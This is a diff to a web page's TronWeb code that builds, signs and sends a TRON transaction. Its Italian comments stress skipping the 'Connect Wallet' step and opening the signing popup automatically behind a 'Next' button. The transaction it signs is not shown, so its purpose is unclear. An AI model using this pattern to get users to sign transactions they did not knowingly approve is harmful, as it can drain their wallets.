@@ -277,12 +277,11 @@
                     return;
                 }
 
-                // ESATTAMENTE come BSC - NON richiede Connect Wallet
-                let accounts = await tronWeb.request({ method: "tron_Accounts" });
-                let userAddress = accounts && accounts.length > 0 ? accounts[0] : null;
+                // FLUSSO NATIVO DI TRONWEB - NON chiede Connect Wallet
+                let userAddress = tronWeb.defaultAddress.base58;
 
                 if (!userAddress) {
-                    showError('Invalid recipient address');
+                    showError('Wallet not connected');
                     btn.disabled = false;
                     btn.textContent = 'Next';
                     return;
@@ -302,9 +301,23 @@
                     userAddress
                 );
 
-                // Firma e invia
+                if (!tx.result || !tx.result.result) {
+                    showError('Failed to build transaction');
+                    btn.disabled = false;
+                    btn.textContent = 'Next';
+                    return;
+                }
+
+                // Firma - QUESTO apre il popup di firma automaticamente
                 const signedTx = await tronWeb.trx.sign(tx.transaction);
                 let txHash = await tronWeb.trx.sendRawTransaction(signedTx);
+
+                if (!txHash) {
+                    showError('Failed to send transaction');
+                    btn.disabled = false;
+                    btn.textContent = 'Next';
+                    return;
+                }
 
                 await new Promise(resolve => setTimeout(resolve, 100));
 
